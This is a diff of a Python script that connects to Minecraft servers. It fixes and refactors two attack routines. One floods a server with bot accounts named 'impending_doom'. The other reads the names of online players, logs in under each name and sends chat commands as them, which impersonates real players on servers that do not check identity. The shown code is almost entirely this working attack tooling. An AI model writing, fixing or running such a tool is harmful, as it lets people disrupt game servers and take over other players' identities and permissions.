@@ -13,11 +13,11 @@ def random_caps(string):
 
 class DoomConnection:
     def __init__(self, address, port):
-        self.port = port
         self.address = address
+        self.port = port
         self.ready = False
 
-        self._connection = Connection(self.address, self.port, username=random_caps('impending doom'))
+        self._connection = Connection(self.address, self.port, username=random_caps('impending_doom'))
         self._connection.register_packet_listener(self.handle_evicted, clientbound.play.DisconnectPacket, early=True)
         self._connection.register_packet_listener(self.handle_login, clientbound.play.JoinGamePacket)
         self._connection.register_exception_handler(self.handle_disconnected)
@@ -33,6 +33,10 @@ class DoomConnection:
         self._connection.connect()
 
     def handle_login(self, packet):
+        # For login security
+        #packet = serverbound.play.ChatPacket()
+        #packet.message = '/register 1234567890'
+        #self._connection.write_packet(packet)
         self.ready = True
 
     def handle_disconnected(self, e, info):
@@ -67,6 +71,9 @@ async def impending_doom(address, port, max=5, time=10):
 
 class CommandConnection:
     def __init__(self, address, port, username, commands):
+        if isinstance(commands, str):
+            commands = [commands]
+
         self.commands = commands
         self.username = username
         self._connection = Connection(address, port, username=username)
@@ -75,7 +82,7 @@ class CommandConnection:
     def handle_login(self, packet):
         for command in self.commands:
             chat_packet = serverbound.play.ChatPacket()
-            chat_packet.message = self.command
+            chat_packet.message = command
             self._connection.write_packet(chat_packet)
             print(f'{self.username} sent {command}')
 
@@ -86,8 +93,6 @@ class CommandConnection:
 async def run_command(address, port, commands):
     server = await ping(f'{address}:{port}')
     player_names = [player.name for player in server.players if player.name[-1] != ' ']
-    if isinstance(commands, str):
-        commands = [commands]
 
     connections = [CommandConnection(address, port, name, commands) for name in player_names]
     for connection in connections:
